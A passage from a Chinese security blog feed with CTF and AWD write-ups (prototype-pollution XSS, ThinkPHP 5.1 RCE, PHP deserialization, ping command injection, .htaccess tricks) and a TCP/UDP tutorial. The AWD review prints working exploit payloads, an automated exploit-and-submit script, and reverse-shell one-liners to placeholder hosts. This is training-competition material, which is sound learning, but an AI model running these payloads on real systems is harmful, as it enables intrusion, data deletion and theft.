&#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对<code>config.source</code>进行了<code>delete</code>处理，而且我们要输出的<code>src</code>也是<code>config.source</code>，那能不能通过原型链污染来把他的值给覆盖成<code>#&quot; onerror=prompt(1) /&gt;</code>呢？</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321222255192.png" alt="image-20200321222255192"></p><p>这里要满足删除条件是满足这个正则</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">  <span class="keyword">delete</span> config.source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给<code>source</code>传过去一个<code>#</code>即可</p><p>这里直接传的话，会发现<code>src</code>无法闭合</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200325151907487.png" alt="image-20200325151907487"></p><p>这里找了一下，网上建议是用正则的匹配规则</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200325151950002.png" alt="image-20200325151950002"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200325152120263.png" alt="image-20200325152120263"></p><p>所以这里通过$`来实现把前面<code>&lt;img src=&quot;</code>重复输出来闭合<code>src</code></p><p>这时候实际上<code>src=&quot;&lt;img src=&quot;</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200325152450879.png" alt="image-20200325152450879"></p><blockquote><p>Payload: <code>{&quot;source&quot;:&quot;#&quot;,&quot;__proto__&quot;: {&quot;source&quot;:&quot;$`onerror=prompt(1) /&gt;&quot;}}</code></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原型链污染的概念以及原理&lt;/li&gt;
&lt;li&gt;如何利用原型链污染&lt;/li&gt;
&lt;li&gt;例子分析&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="JavaScript" scheme="https://a2u13.com/categories/JavaScript/"/>
    
    
      <category term="原型链污染" scheme="https://a2u13.com/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>星盟20200314AWD训练赛复盘</title>
    <link href="https://a2u13.com/2020/03/14/%E6%98%9F%E7%9B%9F20200314AWD%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    <id>https://a2u13.com/2020/03/14/%E6%98%9F%E7%9B%9F20200314AWD%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%A4%8D%E7%9B%98/</id>
    <published>2020-03-14T08:47:01.000Z</published>
    <updated>2020-06-07T06:28:28.886Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><ul><li>ThinkPHP5.1REC</li><li>任意文件上传绕过</li><li>system直接读flag</li><li>反序列化动态命令执行</li><li>ping饶过过滤命令执行</li><li>.htaccess解析命令执行</li><li>闭合注释饶过命令执行</li></ul><a id="more"></a><h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><p>Web1考的是<code>ThinkPHP5.1</code>的<code>RCE</code></p><p>这里直接找了<code>Payload</code>直接打</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=系统命令</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    requests.get(<span class="string">"http://39.100.119.37:10&#123;&#125;80/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ln -s /flag ./jquery.min.js"</span>.format(str(i)))</span><br><span class="line">    c = requests.get(<span class="string">"http://39.100.119.37:10&#123;&#125;80/jquery.min.js"</span>.format(str(i))).text</span><br><span class="line">    flag = preg.findall(c)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">'web1:'</span> + preg.findall(c)[<span class="number">0</span>])</span><br><span class="line">    r = requests.post(submit_url, json=&#123;<span class="string">"challenge_id"</span>: <span class="number">1</span>, <span class="string">"submission"</span>: flag&#125;, headers=headers).text</span><br><span class="line">    sum = sum + <span class="number">100</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(r)</span><br><span class="line">    <span class="comment"># print('web1:'+preg.findall(c)[0])</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">      <span class="comment"># print(e)</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>, <span class="number">30</span>):</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        requests.get(<span class="string">"http://39.100.119.37:1&#123;&#125;80/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ln -s /flag ./jquery.min.js"</span>.format(str(i)))</span><br><span class="line">        c = requests.get(<span class="string">"http://39.100.119.37:1&#123;&#125;80/jquery.min.js"</span>.format(str(i))).text</span><br><span class="line">        flag = preg.findall(c)[<span class="number">0</span>]</span><br><span class="line">        print(<span class="string">'web1:'</span> + preg.findall(c)[<span class="number">0</span>])</span><br><span class="line">        r = requests.post(submit_url, json=&#123;<span class="string">"challenge_id"</span>: <span class="number">1</span>, <span class="string">"submission"</span>: flag&#125;, headers=headers).text</span><br><span class="line">        sum = sum + <span class="number">100</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        print(r)</span><br><span class="line">        <span class="comment"># print('web1:'+preg.findall(c)[0])</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">          <span class="comment"># print(e)</span></span><br><span class="line">          <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里采用了软连接的方式进行权限维持</p><blockquote><p>ln -s 源文件 目标文件</p></blockquote><p>这里我们把根目录下的<code>/flag</code>指向了当前目录下的<code>jquery.min.js</code>，一般而言，没人会关心一个<code>js</code>文件是否存在什么东西，所以可以用来伪装我们的软连接文件</p><p>本来想反弹过来，但发现</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xxxx 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>死活反弹不过来，后来比赛完师傅发了新姿势</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c "sh -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xxxx 0&gt;&amp;1"</span><br></pre></td></tr></table></figure><p>学到了学到了，师傅tql</p><h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><p><code>web2</code>问题挺多的，这里一一枚举</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>在<code>admin/upload.php</code>文件当中存在文件上传</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314165550.png" alt=""></p><p>可以看到没过滤<code>php5、php3、php7、phtml</code>等等，最重要的一点是，<code>.htaccess</code>打错字了。。。</p><p>所以很简单，可以传<code>phtml</code>或者<code>.htaccess</code>来改后缀</p><h2 id="system读flag"><a href="#system读flag" class="headerlink" title="system读flag"></a>system读flag</h2><p>这里有两个点</p><p>在<code>admin/index.php</code>当中</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314170620.png" alt=""></p><p>可以看到登录后有读flag命令执行</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314170806.png" alt=""></p><p>这里很迷，用<code>admin/mysql</code>登录不进去，用<code>admin/admin</code>倒是进去了，进去就可以读到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/ED411FDE1D2AF41EF6BDE91372AFD5B4.jpg" alt=""></p><p>还有一个在<code>login.php</code>下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314171648.png" alt=""></p><p>访问就有<code>flag</code></p><h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>在<code>/common/home.php</code>里有个反序列化</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314171948.png" alt=""></p><p>但我前半场一直没看到，后来才发现的，估计被扬的灰都没了。。。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $method;</span><br><span class="line"><span class="keyword">public</span> $args;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line"><span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">(<span class="keyword">$this</span>-&gt;method)(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$q = <span class="keyword">new</span> home(<span class="string">"system"</span>,<span class="string">"cat /flag;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($q);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"home"</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">"method"</span>;s:<span class="number">6</span>:<span class="string">"system"</span>;s:<span class="number">4</span>:<span class="string">"args"</span>;s:<span class="number">10</span>:<span class="string">"cat /flag;"</span>;&#125;</span><br></pre></td></tr></table></figure><p>后来发现了传发过去也有问题，没反应，估计<code>PHP</code>版本有问题吧。。</p><h2 id="ping命令执行"><a href="#ping命令执行" class="headerlink" title="ping命令执行"></a>ping命令执行</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314172154.png" alt=""></p><p>这里过滤了<code>空格、;和|</code>,但还是可以绕过去，用<code>%09</code>或者<code>${IFS}</code>饶过</p><p><strong>Payload:</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?1=127.0.0.1%26%26rm%%09../index.php;</span><br></pre></td></tr></table></figure><p>先把他的主页给删了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?1=127.0.0.1%26%26ln%09-s%09/flag%09./jquery.min.js;</span><br></pre></td></tr></table></figure><p>然后把<code>/flag</code>指向<code>/common</code>目录下的<code>jquery.min.js</code>文件里</p><p>然后读这个<code>js</code>即可</p><h2 id="readme-md与-htaccess"><a href="#readme-md与-htaccess" class="headerlink" title="readme.md与.htaccess"></a>readme.md与.htaccess</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314172956.png" alt=""></p><p><code>readme.md</code>下面有这么一段话，虽然不知道在哪里用</p><p>但我感觉是文件包含，就赶紧把这个删了</p><p>（后来才知道，有个<code>.htaccess</code>文件，当时师傅复制给我的时候漏了</p><blockquote><p>AddType application/x-httpd-php .html .md</p></blockquote><p>直接拿来当<code>PHP</code>用即可</p><h2 id="命令闭合文件上传"><a href="#命令闭合文件上传" class="headerlink" title="命令闭合文件上传"></a>命令闭合文件上传</h2><p>在<code>index.php</code>下有这么几段代码</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314174344.png" alt=""></p><p>跟过去看看函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314174421.png" alt=""></p><p>一开始不知道咋弄，但知道有问题，就删了，比赛完看了看细节</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314180211.png" alt=""></p><p>我一开始想的是通过这个方法来执行<code>File</code>类里的<code>save</code>方法，但发现他直接<code>return True</code>了，所以说没法利用</p><p>但我们可以靠注释和<code>;</code>来执行多条命令</p><p>这里我们需要找一个<code>/lib</code>里的类作为<code>run_c</code>要执行的对象</p><p>如果我们选择<code>File</code>类的话，<code>run_a</code>选择<code>save</code>方法的话，这里需要登录</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314204652.png" alt=""></p><p>所以这里找一个新的不需要登录就能用的函数</p><p>我们这里选择<code>User</code>类里的<code>Login</code>函数，后来发现其实只要构造方法里不需要<code>$_SESSION</code>的话，调用的函数不存在都可以</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200314204915.png" alt=""></p><p>我们通过<code>;</code>作为命令分界，然后用<code>//</code>把后面的<code>()</code>注释掉就可以了</p><p>若有新的姿势将会补充……..</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ThinkPHP5.1REC&lt;/li&gt;
&lt;li&gt;任意文件上传绕过&lt;/li&gt;
&lt;li&gt;system直接读flag&lt;/li&gt;
&lt;li&gt;反序列化动态命令执行&lt;/li&gt;
&lt;li&gt;ping饶过过滤命令执行&lt;/li&gt;
&lt;li&gt;.htaccess解析命令执行&lt;/li&gt;
&lt;li&gt;闭合注释饶过命令执行&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="AWD" scheme="https://a2u13.com/categories/AWD/"/>
    
    
  </entry>
  
  <entry>
    <title>TCP与UDP略解</title>
    <link href="https://a2u13.com/2020/03/13/TCP%E4%B8%8EUDP%E7%95%A5%E8%A7%A3/"/>
    <id>https://a2u13.com/2020/03/13/TCP%E4%B8%8EUDP%E7%95%A5%E8%A7%A3/</id>
    <published>2020-03-13T14:53:13.000Z</published>
    <updated>2020-06-07T06:28:28.924Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><ul><li>TCP的三次握手与四次挥手过程简析</li><li>TCP的拥塞控制简析</li><li>UDP与TCP的区别</li></ul><a id="more"></a><h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><p><a href="https://www.cnblogs.com/lgx-fighting/p/9375858.html" target="_blank" rel="noopener">https://www.cnblogs.com/lgx-fighting/p/9375858.html</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316230955.png" alt=""></p><h2 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200313225426.png" alt=""></p><h3 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h3><ol><li><p>首先，客户机与服务器的TCP进程都处于CLOSED（关闭）状态，当要进行TCP连接时，客户机主动打开连接，服务器被动打开连接（这是因为服务请求总是由客户机向服务器发起，因为想要请求的资源都在服务器上，所以客户机想要获取资源就必须主动向服务器发起请求，而不能是等待服务器向自己（客户机）发起请求）。</p></li><li><p>然后，服务器的TCP进程先创建传输控制块TCB（传输控制块TCB存储了每一个连接中的重要信息，如：TCP连接表，指向发送和接收缓存的指针，指向重传队列的指针，当前的发送和接收序号，等等），此时，服务器就处于LISTEN（收听）状态。同样的，客户机也会首先创建一个传输控制块TCB发送给服务器。这样，准备工作就做好了。</p></li><li><p><strong>客户端-&gt;服务端(Listening)</strong></p><p>客户端向服务端发送<code>SYN=1以及seq=x</code>，表明自己想要建立连接，然后发送后客户端就处于<code>SYN-SENT</code>阶段，表名自己已经发送了连接请求</p></li><li><p><strong>服务端-&gt;客户端</strong></p><p>客户端收到来自客户端的连接请求后，就要回复客户端，设置<code>ACK=1和SYN=1</code>表示自己确认收到连接请求，可以建立连接。同时发送<code>ack=x+1</code>作为自己的确认<code>ack</code>值，同时发送一个新的<code>seq=y</code>，然后自己进入<code>SYN-RCVD</code>状态</p></li><li><p><strong>客户端-&gt;服务端</strong></p><p>在收到来自服务端的可以连接的回复后，客户端设置设置自己的<code>ACK</code>标志位为1，然后设置自己的<code>ack=y+1</code>，表示自己的确认<code>ack</code>值，如果携带数据，则消耗一个序列，这样客户机下次发送报文段时的序号为x+2不携带数据则<code>seq=x+1</code>，这个来自于第一次客户端向服务端发起请求的<code>seq=x</code>，由于这是第二个包，所以<code>seq=x+1</code>,发送完毕后客户端进入<code>ESTABLISHED</code>状态，服务端接收到客户端发来的第三次握手信息后也进入<code>ESTABLISHED</code>状态</p></li></ol><p><img src="http://a2u13-pic.oss-accelerate.aliyuncs.com/pic/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.gif" alt=""></p><p>对TCP三次握手的抓包分析：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200313234918.png" alt=""></p><h3 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h3><ol><li><p><strong>为什么要三次握手而不是两次握手</strong></p><p>三次握手的目的在于客户端课服务端相互协商好准备发送数据，通过序列号的彼此确认来进行协商</p><p>如果只是两次握手的话，如果客户端向服务端发送连接请求后，服务端向客户端发送自己的应答。按照两次握手的逻辑，服务端认定自己握手成功了，就等客户端发来数据传输信息。但如果服务端的应答信息在传输中丢失了，虽然服务端认为自己握手成功了，但客户端一直没收到这个应答请求，就会认定连接失败了，一直等待服务端的应答，对服务端发送的数据都忽略掉，导致进入死锁。</p><p>在三次握手中，如果客户端向服务端发送的第一次请求没有得到回复，那么客户端将会超时重传</p></li><li><p><strong>三次握手中，为什么客户机最后还要再向服务器发送一次确认呢？</strong></p><p><strong>我的想法：</strong></p><p>​        这是为了防止已失效的连接请求报文段突然又传到了服务器。所谓“已失效的连接请求报文段”是这样产生的。考虑一种正常的情况，客户机发出连接请求，但因为连接请求报文丢失而未收到确认。于是客户机再重传了一次连接请求，后来收到了确认，建立了连接。数据传输完后，就释放了连接。客户机共发送了两个连接请求报文段，其中第一个丢失，第二个到达了服务器，没有所谓的“已失效的连接请求报文段”。</p><p>　　但是如果出现了一种异常情况，即客户机发出的第一个报文段并没有丢失，而是在某个节点上长时间滞留了，直至客户机向服务器发送了第二个报文段并且已经完成数据传输释放了连接，此时，第一个报文到达服务器后会被误以为是客户机重新发起的一次连接请求，实质上是一个早已失效的连接请求。如果没有第三次握手，那么这个连接就建立了，但是客户机并不会向服务器发送任何请求，这样连接就会一直持续，白白的消耗网络资源。</p><p><strong>网上答案：</strong></p><p>​        如果使用的是两次握手建立连接，假设有这样一种场景，客户端发送了第一个请求连接并且没有丢失，只是因为在网络结点中滞留的时间太长了，由于TCP的客户端迟迟没有收到确认报文，以为服务器没有收到，此时重新向服务器发送这条报文，此后客户端和服务器经过两次握手完成连接，传输数据，然后关闭连接。此时此前滞留的那一次请求连接，网络通畅了到达了服务器，这个报文本该是失效的，但是，两次握手的机制将会让客户端和服务器再次建立连接，这将导致不必要的错误和资源的浪费。</p><p>如果采用的是三次握手，就算是那一次失效的报文传送过来了，服务端接受到了那条失效报文并且回复了确认报文，但是客户端不会再次发出确认。由于服务器收不到确认，就知道客户端并没有请求连接。</p></li></ol><h2 id="TCP四次挥手"><a href="#TCP四次挥手" class="headerlink" title="TCP四次挥手"></a>TCP四次挥手</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200313235951.png" alt=""></p><h3 id="过程分析-1"><a href="#过程分析-1" class="headerlink" title="过程分析"></a>过程分析</h3><ol><li>首先客户端向服务端发送<code>FIN=1</code>的数据包，设置<code>seq=u</code>，表明自己想要关闭连接，同时自己进入<code>FIN-WAIT-1</code>状态</li><li>同时这里服务端要表示自己收到了你要关闭连接的请求，发送<code>ACK=1</code>表示自己收到了,<code>ack=u+1</code>作为确认序号，同时这设置<code>seq=v</code>为自己的初始序号，客户端收到这个信息后，自己进入了<code>FIN-WAIT-2</code>状态，处于<code>CLOSE-WAIT</code>状态，客户端在收到服务端发送的这条报文后进入<code>FIN-WAIT-2</code>状态</li><li>然后服务端连续发出报文，设置<code>FIN=1</code>，同时设置<code>ACK=1</code>表示应答，然后<code>ack=u+1</code>，又设置了新的<code>seq=w</code>，这里我其实不是很明白为什么这么麻烦，我感觉可以看做是对客户端发的第一条报文的两次回应</li><li>然后客户端对最后的服务端报文进行回复，回复<code>ACK=1</code>确认，然后设置<code>seq=u+1</code>，我这里认为是自己的发的第二个数据包，这样好记，然后设置<code>ack=w+1</code>，是对服务端最后一个报文的确定，最后服务端关闭了，客户端在等待了<code>2MSL</code>时间后也关闭</li></ol><h3 id="一些问题-1"><a href="#一些问题-1" class="headerlink" title="一些问题"></a>一些问题</h3><p><strong>时间为什么是<code>2MSL</code>?</strong></p><p>​        在Client发送出最后的ACK回复，但该ACK可能丢失。Server如果没有收到ACK，将不断重复发送FIN片段。所以Client不能立即关闭，它必须确认Server接收到了该ACK。Client会在发送出ACK之后进入到TIME_WAIT状态。Client会设置一个计时器，等待2MSL的时间。如果在该时间内再次收到FIN，那么Client会重发ACK并再次等待2MSL。所谓的2MSL是两倍的MSL(Maximum Segment Lifetime)。MSL指一个片段在网络中最大的存活时间，2MSL就是一个发送和一个回复所需的最大时间。如果直到2MSL，Client都没有再次收到FIN，那么Client推断ACK已经被成功接收，则结束TCP连接。</p><p>​        client再发送完最后一个报文端ACK之后，再经过2MSL的时间，就可以是本次连接持续时间内的所有产生的报文段都消失，这样下一次连接中就不会出现旧的请求连接报文段。</p><p><strong>为什么是四次挥手？</strong></p><p>​        因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。</p><h2 id="完整的一次TCP连接"><a href="#完整的一次TCP连接" class="headerlink" title="完整的一次TCP连接"></a>完整的一次TCP连接</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316212144.png" alt=""></p><p>这里我个人认为挥手的包与之前上文分析的不一样，可能在于他把<code>ACK、FIN</code>包给合并了</p><p>所以实际上发了3个挥手数据包</p><h2 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h2><p><a href="https://blog.csdn.net/qq_41431406/article/details/97926927" target="_blank" rel="noopener">https://blog.csdn.net/qq_41431406/article/details/97926927</a></p><p>其实我感觉这个问题，直接说的话说不明白，直接看图倒是十分清晰</p><p><strong>TCP的拥塞控制一般分为四种办法：</strong></p><ul><li>慢开始</li><li>拥塞控制</li><li>快重传</li><li>快回复</li></ul><p><strong>名词解释：</strong></p><ul><li><p>cwnd – 拥塞窗口</p></li><li><p>ssthresh（slow start threshold）– 慢启动到拥塞避免到阈值</p></li><li><p>RTT——Round Trip Time，也就是一个数据包从发出去到回来的时间</p></li><li><p>RTO（Retransmission TimeOut）重发超时时间</p></li></ul><h3 id="慢开始与拥塞避免"><a href="#慢开始与拥塞避免" class="headerlink" title="慢开始与拥塞避免"></a>慢开始与拥塞避免</h3><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316215700.png" alt=""></p><p>为了防止cwnd增长过大引起网络拥塞，还需设置一个慢开始门限ssthresh状态变量。ssthresh的用法如下：</p><ul><li>当cwnd&lt;ssthresh时，使用慢开始算法。</li></ul><ul><li>当cwnd&gt;ssthresh时，改用拥塞避免算法。</li></ul><ul><li>当cwnd=ssthresh时，慢开始与拥塞避免算法任意。</li></ul><p>​        拥塞避免算法让拥塞窗口缓慢增长，即每经过一个往返时间RTT就把发送方的拥塞窗口cwnd加1，而不是加倍。这样拥塞窗口按线性规律缓慢增长。</p><pre><code>无论是在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（其根据就是没有收到确认，虽然没有收到确认可能是其他原因的分组丢失，但是因为无法判定，所以都当做拥塞来处理），就把慢开始门限设置为出现拥塞时的发送窗口大小的一半。然后把拥塞窗口设置为1，执行慢开始算法。</code></pre><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316215926.png" alt=""></p><h3 id="快重传和快恢复"><a href="#快重传和快恢复" class="headerlink" title="快重传和快恢复"></a>快重传和快恢复</h3><p>​        快重传要求接收方在收到一个失序的报文段后就立即发出重复确认（为的是使发送方及早知道有报文段没有到达对方）而不要等到自己发送数据时捎带确认。快重传算法规定，发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待设置的重传计时器时间到期。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316220008.png" alt=""></p><p>快重传配合使用的还有快恢复算法，有以下两个要点:</p><ul><li>当发送方连续收到三个重复确认时，就执行“乘法减小”算法，把ssthresh门限减半。但是接下去并不执行慢开始算法。</li></ul><ul><li>考虑到如果网络出现拥塞的话就不会收到好几个重复的确认，所以发送方现在认为网络可能没有出现拥塞。所以此时不执行慢开始算法，而是将cwnd设置为ssthresh的大小，然后执行拥塞避免算法。</li><li><strong>这里写一下我的看法：</strong>他虽然没说是怎么判断<code>M3</code>未到达，但我猜测是根据<code>seq</code>不连续，导致<code>M3</code>的<code>seq</code>出现断层，从而接受方认为出现了包丢失，从而重复确认前一个包</li></ul><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316220049.png" alt=""></p><blockquote><p>我觉得挺好理解的，就是一个包丢了，发送方再次发送三个数据包收到回应都是丢包之前的最后一次确认包，说明不是拥塞了，而是丢包了，就把<code>cwnd</code>和阈值设置为之前的一半，然后执行拥塞避免，就是又+1、+1</p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316230857.png" alt=""></p><h1 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316232157.png" alt=""></p><h1 id="TCP与UDP的区别"><a href="#TCP与UDP的区别" class="headerlink" title="TCP与UDP的区别"></a>TCP与UDP的区别</h1><p><a href="https://zhuanlan.zhihu.com/p/24860273" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24860273</a></p><p>1、基于连接与无连接；</p><p>2、对系统资源的要求（TCP较多，UDP少）；</p><p>3、UDP程序结构较简单；</p><p>4、流模式与数据报模式 ；</p><p>5、TCP保证数据正确性，UDP可能丢包；</p><p>6、TCP保证数据顺序，UDP不保证。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316232226.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200316232320.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCP的三次握手与四次挥手过程简析&lt;/li&gt;
&lt;li&gt;TCP的拥塞控制简析&lt;/li&gt;
&lt;li&gt;UDP与TCP的区别&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="计算机网络" scheme="https://a2u13.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="TCP" scheme="https://a2u13.com/tags/TCP/"/>
    
      <category term="UDP" scheme="https://a2u13.com/tags/UDP/"/>
    
  </entry>
  
  <entry>
    <title>Laravel5.8.23反序列化分析</title>
    <link href="https://a2u13.com/2020/03/11/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>https://a2u13.com/2020/03/11/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2020-03-11T14:43:34.000Z</published>
